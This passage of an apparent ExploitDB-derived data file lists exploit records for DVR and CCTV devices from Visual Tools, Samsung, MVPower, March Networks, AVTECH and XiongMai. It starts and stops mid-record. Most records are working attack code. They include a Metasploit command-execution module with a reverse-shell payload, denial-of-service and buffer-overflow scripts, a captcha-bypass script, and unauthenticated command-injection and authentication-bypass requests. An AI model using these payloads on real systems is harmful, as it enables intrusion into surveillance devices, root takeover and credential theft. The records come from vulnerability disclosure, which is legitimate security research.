user=administrator;\r\ncurrent_page=main/400_Mconf/200_Mnetwork\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 90\r\n\r\niplistFields=192.168.0.1+192.168.0.2%3b$HTTP_USER_AGENT%3b\r\n\r\nThe command will be executed with the privilege of the apache user.\r\n\r\n5]======== init_diskmgr insecure permissions ========\r\nThe script "/home/apache/DiskManager/cron/init_diskmgr", writable by\r\nthe apache user, is executed by crontab every 15 minutes, with root\r\nprivileges.\r\nSo, editing the script and waiting the scheduled execution, is\r\npossible to run command on the system with root privileges.\r\n\r\nBy default the ssh access is denied because the /etc/shadow don\'t\r\ncontains the root password shadow, but exploiting this vulnerability\r\nis possible to add it and gain ssh access to the system.\r\n\r\n\r\n**************************************************************\r\nTIME-LINE\r\n\r\n- 21/09/2012: Vendor contact. No response.\r\n- 15/10/2012: Disclosure.\r\n**************************************************************', 'description': 'Visual Tools DVR3.0.6.16_ vx series 4.2.19.2 - Multiple Vulnerabilities', 'author': 'Andrea Fabrizi', '_id': 22005, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2012-10-16T00:00:00+00:00', 'cve': [], 'type': 'webapps', 'port': 0}
{'code': '#!/usr/bin/perl -w\r\n#\r\n# Samsung DVR SHR2040 HTTPD Remote Denial of Service DoS PoC\r\n#\r\n# The vulnerability is caused due to an unspecified error in the cgis\r\n# files filter used for configure propierties. This can be exploited by\r\n# sending a specially crafted HTTP request (NO necessary authentication), \r\n# which will cause the HTTP service on the system to crash.\r\n#\r\n# Requisites: Test default ports:\r\n#\r\n# PORT STATE SERVICE\r\n# 554/tcp open rtsp\r\n# 557/tcp open openvms-sysipc\r\n#\r\n# The vulnerability has been reported in versions Samsung DVR\r\n#\r\n# Firmware Version B3.03E-K1.53-V2.19_0705281908, Model = SHR2040\r\n#\r\n# More information: \thttp://www.samsung.com\r\n#\t\t\thttp://www.sybsecurity.com\r\n#\r\n# Very special credits: str0ke, Kf, rathaous, !dsr, 0dd.\r\n#\r\n# and friends: nitr0us, crypkey, dex, xdawn, sirdarckcat, kuza55,\r\n# pikah, codebreak, h3llfyr3, canit0.\r\n#\r\n# Alex Hernandez ahernandez [at] sybsecurity dot com\r\n#\r\n\r\nuse strict;\r\nuse LWP;\r\nuse Data::Dumper;\r\nrequire HTTP::Request;\r\nrequire HTTP::Headers;\r\n\r\nmy $string = \t"/x";\t\t\t\t# Strings to send\r\nmy $method = \t\'GET\';\t\t\t\t# Method "GET" or "POST"\r\nmy $uri = \t\'http://10.50.10.248:557\';\t# IP address:port (change this)\r\nmy $content = \t"/test.html";\t\t\t# Paths to crash\r\n\r\n#my $content = \t"/first.htm";\r\n#my $content = \t"/content_frame.htm?cgiName=";\r\n#my $content = \t"/index_menu.htm?lang=en&topMenu=";\r\n\r\nmy $headers = HTTP::Headers->new(\r\n\r\n\'Accept:\'               => \'*/*\',\r\n\'Referer:\'       \t=> \'http://$1$9hC8DmrL$8NG8i3pQXBabAKo.AIm8U.:12345@10.50.10.248:557\',\r\n\'Accept-Language:\'     \t=> \'en-us,en;q=0.5\',\r\n\'UA-CPU:\'          \t=> \'x86\',\r\n\'Accept-Encoding:\'      => \'gzip, deflate\',\r\n\'User-Agent:\'   \t=> \'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)\',\r\n\'Host:\'          \t=> \'10.50.10.248:557\',\r\n\'Connection\'          \t=> \'keep-alive\',\r\n\'Authorization:\'\t=> \'Basic JDEkOWhDOERtckwkOE5HOGkzcFFYQmFiQUtvLkFJbThVLjoxMjM0NQ==\', # base64 encode ADMIN:12345\r\n\r\n);\r\n\r\nmy $request = HTTP::Request->new($method, $uri, $headers, $content, $string);\r\n\r\nmy $ua = LWP::UserAgent->new;\r\nmy $response = $ua->request($request);\r\n\r\nprint "[+] Denial of Service exploit for Samsung SHR2040 Final\\n";\r\nprint "[+] Coded by: Alex Hernandez [ahernandez\\@sybsecurity.com]\\n";\r\nprint "[+] We got this response from DVR: \\n\\n" . $response->content . "\\n";\r\n\r\nmy $data;\r\n\tforeach my $pair (split(\'&\', $response->content)) {\r\n \t\tmy ($k, $v) = split(\'=\', $pair);\r\n\t\t$data->{$k} = $v;\r\n}\r\n\r\nif ($data->{RESULT} != 0) {\r\n\r\n\tprint "[+] Denial of Service exploit for Samsung SHR2040 Final\\n";\r\n\tprint "[+] Coded by: Alex Hernandez[ahernandez\\@sybsecurity.com]\\n";\r\n\tprint "[+] Use:\\n";\r\n\tprint "\\tperl -x dos_dvrsamsung.pl\\n";\r\n \tprint $data->{RESPMSG} . "\\n";\r\n\texit(0);\r\n\r\n} else {\r\n\r\n \tprint "[+] Denial of service Exploit successed!!!\\n";\r\n\tprint "[+] By Alex Hernandez[ahernandez\\@sybsecurity.com]\\n";\r\n\r\n}\r\n\r\n# milw0rm.com [2008-09-07]', 'description': 'Samsung DVR SHR2040 - HTTPd Remote Denial of Service Denial of Service (PoC)', 'author': 'Alex Hernandez', '_id': 6394, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2008-09-07T00:00:00+00:00', 'cve': [], 'type': 'dos', 'port': 0}
{'code': '##\r\n# This module requires Metasploit: http://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nclass MetasploitModule < Msf::Exploit::Remote\r\n  Rank = ExcellentRanking\r\n\r\n  include Msf::Exploit::Remote::HttpClient\r\n  include Msf::Exploit::CmdStager\r\n\r\n  HttpFingerprint = { :pattern => [ /JAWS\\/1\\.0/ ] }\r\n\r\n  def initialize(info = {})\r\n    super(update_info(info,\r\n      \'Name\'        => \'MVPower DVR Shell Unauthenticated Command Execution\',\r\n      \'Description\' => %q{\r\n        This module exploits an unauthenticated remote command execution\r\n        vulnerability in MVPower digital video recorders. The \'shell\' file\r\n        on the web interface executes arbitrary operating system commands in\r\n        the query string.\r\n\r\n        This module was tested successfully on a MVPower model TV-7104HE with\r\n        firmware version 1.8.4 115215B9 (Build 2014/11/17).\r\n\r\n        The TV-7108HE model is also reportedly affected, but untested.\r\n      },\r\n      \'Author\'      =>\r\n        [\r\n          \'Paul Davies (UHF-Satcom)\', # Initial vulnerability discovery and PoC\r\n          \'Andrew Tierney (Pen Test Partners)\', # Independent vulnerability discovery and PoC\r\n          \'Brendan Coles <bcoles[at]gmail.com>\' # Metasploit\r\n        ],\r\n      \'License\'     => MSF_LICENSE,\r\n      \'Platform\'    => \'linux\',\r\n      \'References\'  =>\r\n        [\r\n          # Comment from Paul Davies contains probably the first published PoC\r\n          [ \'URL\', \'https://labby.co.uk/cheap-dvr-teardown-and-pinout-mvpower-hi3520d_v1-95p/\' ],\r\n          # Writeup with PoC by Andrew Tierney from Pen Test Partners\r\n          [ \'URL\', \'https://www.pentestpartners.com/blog/pwning-cctv-cameras/\' ]\r\n        ],\r\n      \'DisclosureDate\' => \'Aug 23 2015\',\r\n      \'Privileged\'     => true, # BusyBox\r\n      \'Arch\'           => ARCH_ARMLE,\r\n      \'DefaultOptions\' =>\r\n        {\r\n          \'PAYLOAD\' => \'linux/armle/mettle_reverse_tcp\',\r\n          \'CMDSTAGER::FLAVOR\' => \'wget\'\r\n        },\r\n      \'Targets\'        =>\r\n        [\r\n          [\'Automatic\', {}]\r\n        ],\r\n      \'CmdStagerFlavor\' => %w{ echo printf wget },\r\n      \'DefaultTarget\'   => 0))\r\n  end\r\n\r\n  def check\r\n    begin\r\n      fingerprint = Rex::Text::rand_text_alpha(rand(10) + 6)\r\n      res = send_request_cgi(\r\n        \'uri\' => "/shell?echo+#{fingerprint}",\r\n        \'headers\' => { \'Connection\' => \'Keep-Alive\' }\r\n      )\r\n      if res && res.body.include?(fingerprint)\r\n        return CheckCode::Vulnerable\r\n      end\r\n    rescue ::Rex::ConnectionError\r\n      return CheckCode::Unknown\r\n    end\r\n    CheckCode::Safe\r\n  end\r\n\r\n  def execute_command(cmd, opts)\r\n    begin\r\n      send_request_cgi(\r\n        \'uri\' => "/shell?#{Rex::Text.uri_encode(cmd, \'hex-all\')}",\r\n        \'headers\' => { \'Connection\' => \'Keep-Alive\' }\r\n      )\r\n    rescue ::Rex::ConnectionError\r\n      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")\r\n    end\r\n  end\r\n\r\n  def exploit\r\n    print_status("#{peer} - Connecting to target")\r\n\r\n    unless check == CheckCode::Vulnerable\r\n      fail_with(Failure::Unknown, "#{peer} - Target is not vulnerable")\r\n    end\r\n\r\n    print_good("#{peer} - Target is vulnerable!")\r\n\r\n    execute_cmdstager(linemax: 1500)\r\n  end\r\nend', 'description': 'MVPower DVR TV-7104HE 1.8.4 115215B9 - Shell Command Execution (Metasploit)', 'author': 'Metasploit', '_id': 41471, 'source': 'ExploitDB', 'platform': 'arm', 'date': '2017-02-27T00:00:00+00:00', 'cve': [], 'type': 'remote', 'port': 0}
{'code': '#!/usr/bin/perl\r\n#\r\n# March Networks DVR 3204 Logfile Information Disclosure Exploit\r\n#\r\n# Since configuration of the IP address, user console and root is \r\n# carried out over the "administrator console", the vulnerability \r\n# lies within Watchdog\'s HTTP server application.\r\n#\r\n# Any user can obtain the log files without authentication by accessing\r\n# the following PATH http:/dvraddress/scripts/logfiles.tar.gz. The intruder\r\n# can then uncompress the tar file and access the config.dat to reveal\r\n# username and passwords, names of devices, and IP addresses of other \r\n# security components attached to the corporate networ\r\n#\r\n# More details: \r\n# http://www.sybsecurity.com/resources/static/\r\n# An_Insecurity_Overview_of_the_March_Networks_DVR-CCTV_3204.pdf\r\n#\r\n# By Alex Hernandez ahernandez [at] sybsecurity [dot] com\r\n#\r\n# Usage: perl -x dvr3204_exp.pl www.marchnetworks.com:80\r\n# Usage: perl -x dvr3204_exp.pl 127.0.0.1:80\r\n#\r\n# $ perl -x dvr3204_exp.pl 10.50.10.246:80\r\n# Trying...\r\n#\r\n# THIS HOST IS VULNERABLE!!! :-)\r\n# Check the details on w w w [dot] sybsecurity [dot] c o m\r\n#\r\n# THIS HOST IS NOT VULNERABLE :-(\r\n# Check the settings on browser...\r\n#\r\n# \r\n\r\nuse Socket;\r\n\r\nif ($#ARGV<0) {die "\r\n\\nMarch Networks DVR 3204 exploit\\n\r\nMore details: http://www.sybsecurity.com\r\nBy Alex Hernandez\\n \r\nahernandez [at] sybsecurity [dot] com\\n\r\n\r\nUsage: perl -x $0 www.marchnetworks.com:80\r\nUsage: perl -x $0 127.0.0.1:80\\n\\n";}\r\n\r\n($host,$port)=split(/:/,@ARGV[0]);\r\n\r\nprint "Trying...\\n\\n";\r\n$target = inet_aton($host);\r\n$flag=0;\r\n\r\nmy @results=sendraw("GET /Level1Authenticate.htm HTTP/1.0\\r\\n\\r\\n");\r\nforeach $line (@results){\r\n if ($line =~ /Directory/) {$flag=1;}}\r\n\r\nmy @results=sendraw("GET /UserAuthenticate.htm HTTP/1.0\\r\\n\\r\\n");\r\nforeach $line (@results){\r\n if ($line =~ /Directory/) {$flag=1;}}\r\n\r\nmy @results=sendraw("GET /public/index.htm HTTP/1.0\\r\\n\\r\\n");\r\nforeach $line (@results){\r\n if ($line =~ /Directory/) {$flag=1;}}\r\n\r\nmy @results=sendraw("GET /public/UpgradeStatus.htm HTTP/1.0\\r\\n\\r\\n");\r\nforeach $line (@results){\r\n if ($line =~ /Directory/) {$flag=1;}}\r\n\r\nmy @results=sendraw("GET /public/UpgradeHistory.htm HTTP/1.0\\r\\n\\r\\n");\r\nforeach $line (@results){\r\n if ($line =~ /Directory/) {$flag=1;}}\r\n\r\nmy @results=sendraw("GET /public/UpgradeHistory.txt HTTP/1.0\\r\\n\\r\\n");\r\nforeach $line (@results){\r\n if ($line =~ /Directory/) {$flag=1;}}\r\n\r\nmy @results=sendraw("GET /public/dvrlog HTTP/1.0\\r\\n\\r\\n");\r\nforeach $line (@results){\r\n if ($line =~ /Directory/) {$flag=1;}}\r\n\r\nmy @results=sendraw("GET /scripts/logfiles.tar.gz HTTP/1.0\\r\\n\\r\\n");\r\nforeach $line (@results){\r\n if ($line =~ /Directory/) {$flag=1;}}\r\n\r\nif ($flag==1){print "THIS HOST IS VULNERABLE!!! :-)\\n\r\nCheck the details on www [dot] sybsecurity [dot] com\\n";}\r\nelse {print "THIS HOST IS NOT VULNERABLE :-( \\n\r\nCheck the settings on browser...\\n";}\r\n\r\nsub sendraw {\r\n        my ($pstr)=@_;\r\n        socket(S,PF_INET,SOCK_STREAM,getprotobyname(\'tcp\')||0) ||\r\n                die("Socket problems\\n");\r\n        if(connect(S,pack "SnA4x8",2,$port,$target)){\r\n                my @in;\r\n                select(S); $|=1; print $pstr;\r\n                while(<S>){ push @in, $_;}\r\n                select(STDOUT); close(S); return @in;\r\n        } else { die("Can\'t connect check the port or address...\\n"); }\r\n}\r\n\r\n# milw0rm.com [2007-12-27]', 'description': 'March Networks DVR 3204 - Logfile Information Disclosure', 'author': 'Alex Hernandez', '_id': 4797, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2007-12-27T00:00:00+00:00', 'cve': [], 'type': 'remote', 'port': 0}
{'code': 'Core Security - Corelabs Advisory\r\nhttp://corelabs.coresecurity.com/\r\n\r\nAVTECH DVR multiple vulnerabilities\r\n\r\n\r\n1. *Advisory Information*\r\n\r\nTitle: AVTECH DVR multiple vulnerabilities\r\nAdvisory ID: CORE-2013-0726\r\nAdvisory URL:\r\nhttp://www.coresecurity.com/advisories/avtech-dvr-multiple-vulnerabilities\r\nDate published: 2013-08-28\r\nDate of last update: 2013-08-28\r\nVendors contacted: AVTECH Corporation\r\nRelease mode: User release\r\n\r\n\r\n2. *Vulnerability Information*\r\n\r\nClass: Buffer overflow [CWE-119], Buffer overflow [CWE-119], Improper\r\nAccess Control [CWE-284]\r\nImpact: Code execution, Security bypass\r\nRemotely Exploitable: Yes\r\nLocally Exploitable: No\r\nCVE Name: CVE-2013-4980, CVE-2013-4981, CVE-2013-4982\r\n\r\n\r\n3. *Vulnerability Description*\r\n\r\nMultiple vulnerabilities have been found in AVTECH AVN801 DVR [1] (and\r\npotentially other devices sharing the affected firmware) that could\r\nallow a remote attacker:\r\n\r\n   1. [CVE-2013-4980] To execute arbitrary code without authentication\r\nby exploiting a buffer overflow in the RTSP packet handler.\r\n   2. [CVE-2013-4981] To execute arbitrary code without authentication\r\nby exploiting a buffer overflow in \'/cgi-bin/user/Config.cgi\', via a\r\nspecially crafted HTTP POST request.\r\n   3. [CVE-2013-4982] To bypass the captcha of the administration login\r\nconsole enabling several automated attack vectors.\r\n\r\n\r\n4. *Vulnerable Packages*\r\n\r\n   . DVR 4CH H.264 (AVTECH AVN801) firmware 1017-1003-1009-1003.\r\n   . Older versions are probably affected too, but they were not checked.\r\n\r\n\r\n5. *Vendor Information, Solutions and Workarounds*\r\n\r\nThere was no official answer from AVTECH support team after several\r\nattempts (see [Sec. 8]); contact vendor for further information. Some\r\nmitigation actions may be:\r\n\r\n   . Do not expose the DVR to internet unless absolutely necessary.\r\n   . Have at least one proxy filtering the \'SETUP\' parameter in RTSP\r\nrequests.\r\n   . Have at least one proxy filtering the \'Network.SMTP.Receivers\'\r\nparameter in HTTP requests to \'/cgi-bin/user/Config.cgi\'.\r\n\r\n\r\n6. *Credits*\r\n\r\n[CVE-2013-4980] was discovered and researched by Anibal Sacco from Core\r\nSecurity Exploit Writers Team. [CVE-2013-4981] and [CVE-2013-4982] were\r\ndiscovered and researched by Facundo Pantaleo from Core Security\r\nConsulting Team.\r\n\r\n\r\n7. *Technical Description / Proof of Concept Code*\r\n\r\n\r\n7.1. *Buffer Overflow in RTSP Packet Handler*\r\n\r\n[CVE-2013-4980] The following Python script sends a specially crafted\r\npacket that triggers a buffer overrun condition when handling the RTSP\r\ntransaction; no authentication is required. As a result, the device\r\ncrashes and it could possibly lead to a remote code execution.\r\n\r\n/-----\r\nimport socket\r\n\r\nHOST = \'192.168.1.1\'\r\nPORT = 554              \r\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\ns.connect((HOST, PORT))\r\ntrigger_pkt = "SETUP\r\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2AaLSaLS\r\nRTSP/1.0\\r\\n"\r\ntrigger_pkt += "CSeq: 1\\r\\n"\r\ntrigger_pkt += "User-Agent: VLC media player (LIVE555 Streaming Media\r\nv2010.02.10)\\r\\n\\r\\n"\r\nprint "[*] Sending trigger"\r\ns.sendall(trigger_pkt)\r\ndata = s.recv(1024)\r\nprint \'[*] Response:\', repr(data), "\\r\\n"\r\ns.close()\r\n-----/\r\n\r\n\r\n7.2. *Buffer Overflow in config.cgi Parameters*\r\n\r\n[CVE-2013-4981] The following Python script exploits other buffer\r\noverflow condition; no authentication is required. As a result, the\r\ndevice crashes and it would possible lead to a remote code execution.\r\n\r\n\r\n/-----\r\nimport httplib\r\n\r\nip = "192.168.1.1"\r\nconn = httplib.HTTPConnection(ip)\r\nconn.request("POST",\r\n"/cgi-bin/user/Config.cgi?action=set&Network.SMTP.Receiversr\nHTTP/1.1")\r\nresp = conn.getresponse()\r\nprint resp.read()\r\n-----/\r\n\r\n\r\n7.3. *CAPTCHA Bypass*\r\n\r\n[CVE-2013-4982] The following Python proof of concept sends a wrong\r\ncaptcha in first place (just to verify that captcha protection is\r\nenabled); then, it sends ten requests with an arbitrary hardcoded\r\ncaptcha and its matching verification code. As a result, the captcha\r\nprotection can by completely bypassed.\r\n\r\n\r\n/-----\r\nimport httplib\r\n\r\nip = "192.168.1.1"\r\nprint "Performing captcha replay with hardcoded wrong captcha code and\r\nverify code..."\r\nconn = httplib.HTTPConnection(ip)\r\nconn.request("GET",\r\n"/cgi-bin/nobody/VerifyCode.cgi?account=YWRtaW46YWRtaW4=&captcha_code=FMUA&verify_code=FMUYyLOivRpgc\r\nHTTP/1.1")\r\nresp = conn.getresponse()\r\nprint "Reading webpage..."\r\nprint resp.read()\r\nprint "Performing several captcha replays with hardcoded right captcha\r\ncode and verify code..."\r\nfor i in range(1, 10):\r\n    conn = httplib.HTTPConnection(ip)\r\n    conn.request("GET",\r\n"/cgi-bin/nobody/VerifyCode.cgi?account=YWRtaW46YWRtaW4=&captcha_code=FMUF&verify_code=FMUYyLOivRpgc\r\nHTTP/1.1")\r\n    resp = conn.getresponse()\r\n    print "Reading webpage..."\r\n    print resp.read()\r\n\r\n-----/\r\n\r\n\r\n8. *Report Timeline*\r\n\r\n. 2013-08-06:\r\nCore Security Technologies attempts to contact vendor using the AVTECH\r\nofficial technical support contact page [2]. No reply received.\r\n\r\n. 2013-08-12:\r\nCore attempts to contact vendor.\r\n\r\n. 2013-08-20:\r\nCore attempts to contact vendor.\r\n\r\n. 2013-08-28:\r\nAfter 3 attempts to contact vendor, the advisory CORE-2013-0726 is\r\nreleased as \'user release\'.\r\n\r\n\r\n9. *References*\r\n\r\n[1] http://www.avtech.com.tw.\r\n[2]\r\nhttp://www.avtech.com.tw/index.php?option=com_content&view=article&id=244&Itemid=453&lang=en.\r\n\r\n\r\n\r\n10. *About CoreLabs*\r\n\r\nCoreLabs, the research center of Core Security Technologies, is charged\r\nwith anticipating the future needs and requirements for information\r\nsecurity technologies. We conduct our research in several important\r\nareas of computer security including system vulnerabilities, cyber\r\nattack planning and simulation, source code auditing, and cryptography.\r\nOur results include problem formalization, identification of\r\nvulnerabilities, novel solutions and prototypes for new technologies.\r\nCoreLabs regularly publishes security advisories, technical papers,\r\nproject information and shared software tools for public use at:\r\nhttp://corelabs.coresecurity.com.\r\n\r\n\r\n11. *About Core Security Technologies*\r\n\r\nCore Security Technologies enables organizations to get ahead of threats\r\nwith security test and measurement solutions that continuously identify\r\nand demonstrate real-world exposures to their most critical assets. Our\r\ncustomers can gain real visibility into their security standing, real\r\nvalidation of their security controls, and real metrics to more\r\neffectively secure their organizations.\r\n\r\nCore Security\'s software solutions build on over a decade of trusted\r\nresearch and leading-edge threat expertise from the company\'s Security\r\nConsulting Services, CoreLabs and Engineering groups. Core Security\r\nTechnologies can be reached at +1 (617) 399-6980 or on the Web at:\r\nhttp://www.coresecurity.com.\r\n\r\n\r\n12. *Disclaimer*\r\n\r\nThe contents of this advisory are copyright (c) 2013 Core Security\r\nTechnologies and (c) 2013 CoreLabs, and are licensed under a Creative\r\nCommons Attribution Non-Commercial Share-Alike 3.0 (United States)\r\nLicense: http://creativecommons.org/licenses/by-nc-sa/3.0/us/.\r\n\r\n\r\n13. *PGP/GPG Keys*\r\n\r\nThis advisory has been signed with the GPG key of Core Security\r\nTechnologies advisories team, which is available for download at\r\nhttp://www.coresecurity.com/files/attachments/core_security_advisories.asc.', 'description': 'AVTECH DVR Firmware 1017-1003-1009-1003 - Multiple Vulnerabilities', 'author': 'Core Security', '_id': 27942, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2013-08-29T00:00:00+00:00', 'cve': ['CVE-2013-4980', 'CVE-2013-4981', 'CVE-2013-4982'], 'type': 'dos', 'port': 0}
{'code': '# Exploit Title: XiongMai uc-httpd 1.0.0 - Buffer Overflow\r\n# Date: 2018-06-08           \r\n# Exploit Author: Andrew Watson\r\n# Software Version: XiongMai uc-httpd 1.0.0\r\n# Vendor Homepage: http://www.xiongmaitech.com/en/\r\n# Tested on: KKMoon DVR running XiongMai uc-httpd 1.0.0 on TCP/81\r\n# CVE ID: CVE-2018-10088\r\n# DISCLAIMER: This proof of concept is provided for educational purposes only!\r\n \r\n#!/usr/bin/python\r\n \r\nimport socket\r\nimport sys\r\n \r\npayload="A" * 85\r\n \r\nprint "\\n###############################################"\r\nprint "XiongMai uc-httpd 1.0.0 Buffer Overflow Exploit"\r\n \r\nif len(sys.argv) < 2:\r\n    print "\\nUsage: " + sys.argv[0] + " <Host>\\n"\r\n    sys.exit()\r\n \r\nprint "\\nTarget: " + sys.argv[1]\r\nprint "Sending exploit..."\r\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\ns.connect((sys.argv[1],81))\r\ns.send(\'POST /login.htm HTTP/1.1\\r\\n\')\r\ns.send(\'command=login&username=\' + payload + \'&password=PoC\\r\\n\\r\\n\')\r\ns.recv(1024)\r\ns.close()\r\nprint "\\nExploit complete!"', 'description': 'XiongMai uc-httpd 1.0.0 - Buffer Overflow', 'author': 'Andrew Watson', '_id': 44864, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2018-06-08T00:00:00+00:00', 'cve': ['CVE-2018-10088'], 'type': 'webapps', 'port': 0}
{'code': '\'\'\'\r\nAvtech devices multiple vulnerabilities\r\n--------------------------------------------------\r\n\r\nPlatforms / Firmware confirmed affected:\r\n- Every Avtech device (IP camera, NVR, DVR) and firmware version. [4]\r\ncontains the list of confirmed firmware versions, which are affected.\r\n- Product page: http://www.avtech.com.tw/\r\n\r\nôAVTECH, founded in 1996, is one of the worldÆs leading CCTV\r\nmanufacturers. With stably increasing revenue and practical business\r\nrunning philosophy, AVTECH has been ranked as the largest public-listed\r\ncompany among the Taiwan surveillance industry. AVTECH makes every\r\neffort on the innovation of technology, product and implementation.\r\nBased on years of research and industry experience, AVTECH has obtained\r\na leading position on mobile platform support and provides a full range\r\nof surveillance products.ö\r\n\r\nAvtech is the second most popular search term in Shodan. According to\r\nShodan, more than 130.000 Avtech devices are exposed to the internet.\r\n\r\nVulnerabilities\r\n---------------\r\n1) Plaintext storage of administrative password\r\nEvery user password is stored in clear text. An attacker with access to\r\nthe device itself can easily obtain the full list of passwords. By\r\nexploiting command injection or authentication bypass issues, the clear\r\ntext admin password can be retrieved.\r\n\r\n2) Missing CSRF protection\r\nThe web interface does not use any CSRF protection. If a valid session\r\nexists for the user, the attacker can modify all settings of the device\r\nvia CSRF. If there is no valid session, but the user did not change the\r\ndefault admin password, the attacker can log in as admin via CSRF as well.\r\n\r\n3) Unauthenticated information disclosure\r\nUnder the /cgi-bin/nobody folder every CGI script can be accessed\r\nwithout authentication.\r\nPOC: GET /cgi-bin/nobody/Machine.cgi?action=get_capability\r\nExample response:\r\nFirmware.Version=1011-1005-1008-1002\r\nMACAddress=00:0E:53:xx:xx:xx\r\nProduct.Type=DVR\r\nProduct.ID=308B\r\nProduct.ShortName=V_full_Indep,V_Multistream\r\nVideo.System=PAL\r\nAudio.DownloadFormat=ULAW\r\nVideo.Input.Num=8\r\nVideo.Output.Num=1\r\nVideo.Format=H264,MJPEG\r\nVideo.Format.Default=H264\r\nVideo.Resolution=4CIF,CIF\r\nVideo.Quality=BEST,HIGH,NORMAL,BASIC\r\nVideo.Local.Input.Num=8\r\nVideo.Local.Output.Num=1\r\nVideo.Local.Format=H264,MJPEG\r\nAudio.Input.Num=8\r\nAudio.Output.Num=1\r\nAudio.Format=ULAW\r\nAudio.Local.Input.Num=8\r\nAudio.Local.Output.Num=1\r\nAudio.Local.Format=PCM\r\nLanguage.Default=ENGLISH\r\nLanguage.Support=ENGLISH&CHINESE&JAPANESE&FRANCE&GERMAN&SPANISH&PORTUGUESE&ITALIAN&TURKISH&POLISH&RUSSIAN&CUSTOMIZE&THAI\r\n&VIETNAM&DUTCH&GREEK&ARABIC&CZECH&HUNGARIAN&HEBREW&CHINA&\r\nCapability=D0,80,A,80\r\nPushNotify.MaxChannel=8\r\n\r\n4) Unauthenticated SSRF in DVR devices\r\nIn case of DVR devices, Search.cgi can be accessed without\r\nauthentication. This service is responsible for searching and accessing\r\nIP cameras in the local network. In newer firmware versions, Search.cgi\r\nprovides the cgi_query action, which performs an HTTP request with the\r\nspecified parameters. By modifying the ip, port and queryb64str\r\nparameters, an attacker is able to perform arbitrary HTTP requests\r\nthrough the DVR device without authentication.\r\nPOC:\r\nhttp://<device_ip>/cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==\r\n\r\n5) Unauthenticated command injection in DVR devices\r\nThe cgi_query action in Search.cgi performs HTML requests with the wget\r\nsystem command, which uses the received parameters without sanitization\r\nor verification. By exploiting this issue, an attacker can execute any\r\nsystem command with root privileges without authentication.\r\nPOC:\r\nhttp://<device_ip>/cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=LW==&username=admin%20;XmlAp%20r%20Account.User1.Password>$(ps|grep%20Search.cgi|grep%20-v%20grep|head%20-n%201|awk%20\'{print%20"/tmp/"$1".log"}\');&password=admin\r\n\r\n6) Authentication bypass #1\r\nVideo player plugins are stored as .cab files in the web root, which can\r\nbe accessed and downloaded without authentication. The cab file request\r\nverification in the streamd web server is performed with the strstr\r\nfunction, which means that a request should not be authenticated if it\r\ncontains the ô.cabö string anywhere in the URL. We note that some of the\r\nmodels contain an additional check in the CgiDaemon, which allows\r\nunauthenticated cgi access only under the /cgi-bin/nobody folder.\r\nPOC:\r\nhttp://<device_ip>/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*\r\n\r\n7) Authentication bypass #2\r\nCgi scripts in the /cgi-bin/nobody folder can be accessed without\r\nauthentication (e.g. for login). The streamd web server verifies whether\r\nthe request can be performed without authentication by searching for the\r\nô/nobodyö string in the URL with  the strstr function. Thus, if a\r\nrequest contains the "/nobody" string anywhere in the URL, it does not\r\nhave to be authenticated. We note that some of the models contain an\r\nadditional check in the CgiDaemon, which allows unauthenticated cgi\r\naccess only under the /cgi-bin/nobody folder.\r\nPOC:\r\nhttp://<device_ip>/cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.*\r\n\r\n8) Unauthenticated file download from web root\r\nIf a cab file is requested, the web server sends the file without\r\nprocessing it. Because the streamd web server verifies the cab file\r\nrequest by searching for the ô.cabö string in the URL with the strstr\r\nfunction, any file (even the cgi scripts) in the web root can be\r\ndownloaded without authentication.\r\nPOC: http://<device_ip>/cgi-bin/cgibox?.cab\r\n\r\n9) Login captcha bypass #1\r\nTo prevent brute-forcing attempts, Avtech devices require a captcha for\r\nlogin requests. However, if the login requests contain the login=quick\r\nparameter, the captcha verification is bypassed.\r\nPOC:\r\nhttp://<device_ip>/cgi-bin/nobody/VerifyCode.cgi?account=<b64(username:password)>&login=quick\r\n\r\n10) Login captcha bypass #2\r\nInstead of using a random session ID, Avtech devices use the\r\nbase64-encoded username and password as the Cookie value. Since the IP\r\naddress of the logged in user is not stored, if an attacker sets the\r\nCookie manually, the captcha verification can by bypassed easily.\r\n\r\n11) Authenticated command injection in CloudSetup.cgi\r\nDevices that support the Avtech cloud contain CloudSetup.cgi, which can\r\nbe accessed after authentication. The exefile parameter of a\r\nCloudSetup.cgi request specifies the system command to be executed.\r\nSince there is no verification or white list-based checking of the\r\nexefile parameter, an attacker can execute arbitrary system commands\r\nwith root privileges.\r\nPOC: http://<device_ip>/cgi-bin/supervisor/CloudSetup.cgi?exefile=ps\r\n\r\n12) Authenticated command injection in adcommand.cgi\r\nSome of the Avtech devices contain adcommand.cgi to perform ActionD\r\ncommands. The adcommand.cgi can be accessed after authentication. In\r\nnewer devices the ActionD daemon provides the DoShellCmd function, which\r\nperforms a system call with the specified parameters. Since there is no\r\nverification or white list-based checking of the parameter of the\r\nDoShellCmd function, an attacker can execute arbitrary system commands\r\nwith root privileges.\r\nPOC:\r\nPOST 